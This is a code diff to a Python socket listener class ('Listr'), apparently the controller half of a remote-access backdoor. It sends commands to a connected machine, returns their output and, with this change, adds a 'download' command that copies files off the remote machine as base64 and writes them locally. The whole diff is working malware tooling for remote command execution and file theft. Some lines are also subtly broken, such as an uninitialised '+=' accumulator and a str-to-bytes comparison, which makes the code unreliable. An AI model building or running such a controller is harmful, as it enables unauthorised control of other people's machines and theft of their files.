@@ -3,7 +3,9 @@
 # General - json is used to manage serilisation to receive large data.
 
 
-import socket, json
+import socket
+import json
+import base64
 
 
 class Listr:
@@ -29,17 +31,23 @@ class Listr:
         while True:
             try:
 #                print("exit 0") #testing
-                json_data = self.conn.recv(1024).decode()
-                if json_data == "":
+                json_data += self.conn.recv(1024).decode() # plus sign is necessary.
+                if json_data == "" or json_data == b'':
+ #                   print("break: " + str(json_data)) #testing
                     break
-#                print("exit 1" + " - json_data: " + json_data) #testing
+ #               print("exit 1" + " - json_data: " + str(json_data)) #testing
                 return json.loads(json_data)
-            except ValueError:                
+            except ValueError:               
                 continue
 
     def exe_rmy(self, comm):
         self.send_data(comm)
         return self.rcve_data()
+
+    def w_f(self, path, item):
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(item))
+            return "\nDownloaded"
 
     def run(self):
         while True:
@@ -48,6 +56,8 @@ class Listr:
                 result = self.exe_rmy(comm)
                 while result == None:
                     result = self.exe_rmy(comm)
+                if comm[0] == "download":
+                    result = self.w_f(comm[1], result.encode())
                 print(result)
                 # if "exit" in comm:
                 #     self.send_data("test...")
